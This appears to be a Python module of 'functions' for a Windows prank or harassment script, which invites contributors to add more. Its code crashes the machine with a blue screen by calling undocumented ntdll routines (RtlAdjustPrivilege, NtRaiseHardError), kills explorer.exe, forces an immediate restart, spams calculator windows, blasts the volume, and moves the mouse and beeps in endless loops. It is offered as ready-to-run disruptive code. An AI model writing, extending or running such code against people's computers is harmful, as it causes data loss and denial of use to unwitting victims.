# you can add your own functions here
# just do def funcname(): and then put your code, and it will be added as a possible function that can run
# make sure you don't make anything that needs administrator / UAC perms as it'll just crash the script

# if you have a good idea, make a pull request and ill most likely accept it, and if I don't ill tell you why,
# if you do make a pull request, try to stick to my format and try to use built-in python libraries to keep dependencies low

def bsod(): # blue screens computer
    from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint())
    )

def kill_explorer(): # kills explorer.exe (taskbar, start menu, etc) twice
    import os
    import time
    os.system("taskkill /f /im explorer.exe")
    time.sleep(30)
    os.system("taskkill /f /im explorer.exe")

def skibidi(): # opens 20 pages of skibidi toilet in a web browser
    import webbrowser
    import time
    for _ in range(10):
        webbrowser.open("https://www.youtube.com/watch?v=KhsXBA_u6HY")
    time.sleep(10)
    for _ in range(10):
        webbrowser.open("https://www.youtube.com/watch?v=KhsXBA_u6HY")

def shutdown(): # shuts down the computer
    import os
    os.system("shutdown /r /t 0")

def earrape(): # sets volume to 0 and then 100 5 seconds later
    import os # todo: make this a bit more annoying somehow, its very light
    import time
    os.system('powershell -Command "$ws = New-Object -ComObject WScript.Shell; 1..50 | ForEach-Object { $ws.SendKeys([char]174) }"')
    time.sleep(5)
    os.system('powershell -Command "$ws = New-Object -ComObject WScript.Shell; 1..50 | ForEach-Object { $ws.SendKeys([char]175) }"')

def spam_calc(): # spams calculator 50 times, very annoying to close
    import os
    for _ in range (50):
        os.system("start calc")

def move_mouse(): # moves the mouse a tiny bit every few seconds
    import time
    import pyautogui
    import random
    while True:
        x = random.randint(-50, 50)
        y = random.randint(-50,50)
        pyautogui.moveRel(x,y, duration=0.15)
        time.sleep(5)

def play_sound(): # plays a very short, high-pitched sound every minute
    import winsound
    import time
    while True:
        winsound.Beep(1000, 500)
        time.sleep(60)
